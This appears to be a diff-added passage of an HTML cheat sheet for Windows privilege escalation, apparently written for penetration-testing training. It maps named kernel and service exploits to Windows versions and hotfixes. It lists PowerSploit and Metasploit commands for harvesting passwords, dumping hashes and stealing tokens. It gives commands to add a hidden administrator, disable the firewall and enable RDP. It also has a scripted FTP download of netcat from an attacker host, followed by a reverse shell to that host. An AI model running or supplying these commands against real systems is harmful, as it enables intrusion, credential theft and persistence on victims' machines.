+1911&nbsp;&nbsp;Mrxsmb.sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS06-030&nbsp;&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+2412&nbsp;&nbsp;Windows&nbsp;Kernel&nbsp;MS06-049&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+3220&nbsp;&nbsp;Print&nbsp;spool&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+5518&nbsp;&nbsp;win32k.sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS08-025&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP1,2&nbsp;&nbsp;&nbsp;SP0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+6705&nbsp;&nbsp;Churrasco&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS09-012&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+6705&nbsp;&nbsp;Churraskito&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+21923&nbsp;Winlogon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+11199&nbsp;KiTrap0D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS10-015&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All
+14610&nbsp;Chimichurri&nbsp;&nbsp;&nbsp;&nbsp;MS10-059&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP0
+15589&nbsp;Task&nbsp;Scheduler&nbsp;MS10-092&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP0,1,2&nbsp;&nbsp;SP1,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP0
+18176&nbsp;AFD.Sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS11-080&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+100&nbsp;&nbsp;&nbsp;RPC&nbsp;DCOM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS03-026&nbsp;&nbsp;SP3,4&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+103&nbsp;&nbsp;&nbsp;RPC2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS03-039&nbsp;&nbsp;all&nbsp;(CN)&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+109&nbsp;&nbsp;&nbsp;RPC2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS03-039&nbsp;&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+119&nbsp;&nbsp;&nbsp;Netapi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS03-049&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+3022&nbsp;&nbsp;ASN.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS04-007&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+275&nbsp;&nbsp;&nbsp;SSL&nbsp;BOF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS04-011&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+295&nbsp;&nbsp;&nbsp;Lsasarv.dll&nbsp;&nbsp;&nbsp;&nbsp;MS04-011&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+734&nbsp;&nbsp;&nbsp;NetDDE&nbsp;BOF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS04-031&nbsp;&nbsp;SP2,3,4&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+1075&nbsp;&nbsp;Messaging&nbsp;QueueMS05-017&nbsp;&nbsp;SP3,4&nbsp;&nbsp;&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+1149&nbsp;&nbsp;PnP&nbsp;Service&nbsp;&nbsp;&nbsp;&nbsp;MS05-039&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+2223&nbsp;&nbsp;<span class="red">CP</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS06-040&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+2265&nbsp;&nbsp;NetIPSRemote&nbsp;&nbsp;&nbsp;MS06-040&nbsp;&nbsp;SP0-4&nbsp;&nbsp;&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+2789&nbsp;&nbsp;NetPManageIP&nbsp;&nbsp;&nbsp;MS06-070&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+7104&nbsp;&nbsp;Service&nbsp;<span class="red">exec</span>&nbsp;&nbsp;&nbsp;MS08-067&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2,3&nbsp;&nbsp;&nbsp;&nbsp;SP1,2&nbsp;&nbsp;&nbsp;SP0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP0,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+7132&nbsp;&nbsp;Service&nbsp;<span class="red">exec</span>&nbsp;&nbsp;&nbsp;MS08-067&nbsp;&nbsp;SP4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-
+14674&nbsp;SRV2.SYS&nbsp;SMB&nbsp;&nbsp;&nbsp;MS09-050&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SP1,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-</code></pre>
+                <pre><code>&nbsp;&nbsp;&nbsp;MS*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HotFix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OS
+MS16-032&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3143141&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;,7,8,10&nbsp;Windows&nbsp;Server&nbsp;2012
+MS16-016&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3136041&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;Vista,&nbsp;7&nbsp;WebDAV
+MS15-051&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3057191&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;Windows&nbsp;7,&nbsp;Windows&nbsp;8,&nbsp;Windows&nbsp;2012
+MS14-058&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3000061&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;Windows&nbsp;Server&nbsp;2012,&nbsp;7,&nbsp;8&nbsp;Win32k.sys
+MS14-040&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2975684&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;8,&nbsp;Windows&nbsp;Server&nbsp;2012
+MS14-002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2914368&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;XP,&nbsp;Windows&nbsp;Server&nbsp;2003
+MS13-005&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2778930&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;8,
+MS10-092&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2305420&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7
+MS10-015&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB977165&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;XP
+MS14-002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2914368&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;XP
+MS15-061&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3057839&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;8,&nbsp;Windows&nbsp;Server&nbsp;2012
+MS11-080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2592799&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;XP
+MS11-062&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2566454&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;XP
+MS15-076&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3067505&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;8,&nbsp;Windows&nbsp;Server&nbsp;2012
+MS16-075&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3164038&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;8,&nbsp;Windows&nbsp;Server&nbsp;2012
+MS15-010&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB3036220&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;XP
+MS11-046&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KB2503665&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;Server&nbsp;2003,&nbsp;Windows&nbsp;Server&nbsp;2008,&nbsp;7,&nbsp;XP</code></pre>
+                <pre><code>MS11-011&nbsp;(KB2393802)
+MS10-059&nbsp;(KB982799)
+MS10-021&nbsp;(KB979683)
+MS11-080&nbsp;(KB2592799)</code></pre>
+                <p>Exploits worth looking at: MS11-046</p>
+                <pre><code><span class="blue">https://github.com/SecWiki/windows-kernel-exploits</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Windows version map"></a>
+            <legend>Windows version map</legend>
+                <pre><code>Operating&nbsp;System&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version&nbsp;Number
+
+Windows&nbsp;1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.04
+Windows&nbsp;2.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.11
+Windows&nbsp;3.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3
+Windows&nbsp;NT&nbsp;3.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.10.528
+Windows&nbsp;<span class="red">for</span>&nbsp;Workgroups&nbsp;3.11&nbsp;&nbsp;&nbsp;&nbsp;3.11
+Windows&nbsp;NT&nbsp;Workstation&nbsp;3.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.5.807
+Windows&nbsp;NT&nbsp;Workstation&nbsp;3.51&nbsp;&nbsp;&nbsp;&nbsp;3.51.1057
+Windows&nbsp;95&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0.950
+Windows&nbsp;NT&nbsp;Workstation&nbsp;4.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0.1381
+Windows&nbsp;98&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.1.1998
+Windows&nbsp;98&nbsp;Second&nbsp;Edition&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.1.2222
+Windows&nbsp;Me&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.90.3000
+Windows&nbsp;2000&nbsp;Professional&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.0.2195
+Windows&nbsp;XP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.1.2600
+Windows&nbsp;Vista&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.0.6000
+Windows&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.1.7600
+Windows&nbsp;8.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.3.9600
+Windows&nbsp;10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.0.10240</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="EoP 9: Automated tools"></a>
+            <legend>EoP 9: Automated tools</legend>
+                <p>Powersploit</p>
+                <pre><code><span class="blue">https://github.com/PowerShellMafia/PowerSploit
+Get-GPPPassword
+Get-UnattendedInstallFile
+Get-Webconfig
+Get-ApplicationHost
+Get-SiteListPassword
+Get-CachedGPPPassword
+Get-RegistryAutoLogon</span></code></pre>
+                <p>Metasploit</p>
+                <pre><code>post/windows/gather/credentials/gpp
+post/windows/gather/enum_unattend</code></pre>
+                <pre><code>getsystem
+getprivs
+use&nbsp;priv
+hashdump</code></pre>
+                <p>Metasploit incognito</p>
+                <pre><code>use&nbsp;incognito
+list_tokens&nbsp;-u
+list_tokens&nbsp;-g
+impersonate_token&nbsp;DOMAIN_NAME\\USERNAME
+steal_token&nbsp;PID
+drop_token
+rev2self</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Useful commands"></a>
+            <legend>Useful commands</legend>
+                <p>Add a new user</p>
+                <pre><code>$&nbsp;net&nbsp;user&nbsp;test&nbsp;1234&nbsp;/add
+$&nbsp;net&nbsp;localgroup&nbsp;administrators&nbsp;test&nbsp;/add</code></pre>
+                <p>Print files contents:</p>
+                <pre><code>$&nbsp;type&nbsp;file</code></pre>
+                <p>Remove file</p>
+                <pre><code>$&nbsp;<span class="blue">del</span>&nbsp;/f&nbsp;file</code></pre>
+                <p>Change password for user:</p>
+                <pre><code>$&nbsp;net&nbsp;user&nbsp;&lt;user&gt;&nbsp;&lt;password&gt;</code></pre>
+                <p>List users:</p>
+                <pre><code>$&nbsp;net&nbsp;user</code></pre>
+                <p>Info about a user:</p>
+                <pre><code>$&nbsp;net&nbsp;user&nbsp;&lt;username&gt;</code></pre>
+                <p>Permissions on a folder recursively:</p>
+                <pre><code>$&nbsp;cacls&nbsp;*.*&nbsp;/t&nbsp;/e&nbsp;/g&nbsp;domainname\administrator:f</code></pre>
+                <p>tasklist or wmic process or tasklist /svc</p>
+                <p>Enable RDP access</p>
+                <pre><code>reg&nbsp;add&nbsp;<span class="green">"hklm\system\currentcontrolset\control\terminal server"</span>&nbsp;/f&nbsp;/v&nbsp;fDenyTSConnections&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;0
+netsh&nbsp;firewall&nbsp;set&nbsp;service&nbsp;remoteadmin&nbsp;enable
+netsh&nbsp;firewall&nbsp;set&nbsp;service&nbsp;remotedesktop&nbsp;<span class="red">enable</span></code></pre>
+                <p>Disable firewall</p>
+                <pre><code>$&nbsp;netsh&nbsp;firewall&nbsp;set&nbsp;opmode&nbsp;disable</code></pre>
+                <p>Run exploit</p>
+                <pre><code>C:\tmp&gt;powershell&nbsp;-ExecutionPolicy&nbsp;ByPass&nbsp;-command&nbsp;<span class="green">"&amp; { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Transferring files"></a>
+            <legend>Transferring files</legend>
+                <p>Paste the following code to get nc in the victim:</p>
+                <pre><code><span class="red">echo</span>&nbsp;open&nbsp;&lt;attacker_ip&gt;&nbsp;21&gt;&nbsp;ftp.txt
+echo&nbsp;USER&nbsp;offsec&gt;&gt;&nbsp;ftp.txt
+echo&nbsp;ftp&gt;&gt;&nbsp;ftp.txt
+echo&nbsp;bin&nbsp;&gt;&gt;&nbsp;ftp.txt
+echo&nbsp;GET&nbsp;nc.exe&nbsp;&gt;&gt;&nbsp;ftp.txt
+echo&nbsp;bye&nbsp;&gt;&gt;&nbsp;ftp.txt
+ftp&nbsp;-v&nbsp;-n&nbsp;-s:ftp.txt
+nc.exe&nbsp;&lt;attacker_ip&gt;&nbsp;1234&nbsp;-e&nbsp;cmd.exe</code></pre>
+                <p>Bounce port sanning</p>
+                <pre><code>$&nbsp;nc&nbsp;$ip&nbsp;21
+220&nbsp;Femitter&nbsp;<span class="red">FTP</span>&nbsp;Server&nbsp;ready.
+USER&nbsp;anonymous
+331&nbsp;Password&nbsp;required&nbsp;<span class="red">for</span>&nbsp;anonymous.
+PASS&nbsp;foo
+230&nbsp;User&nbsp;anonymous&nbsp;logged&nbsp;in.
+PORT&nbsp;127,0,0,1,0,80
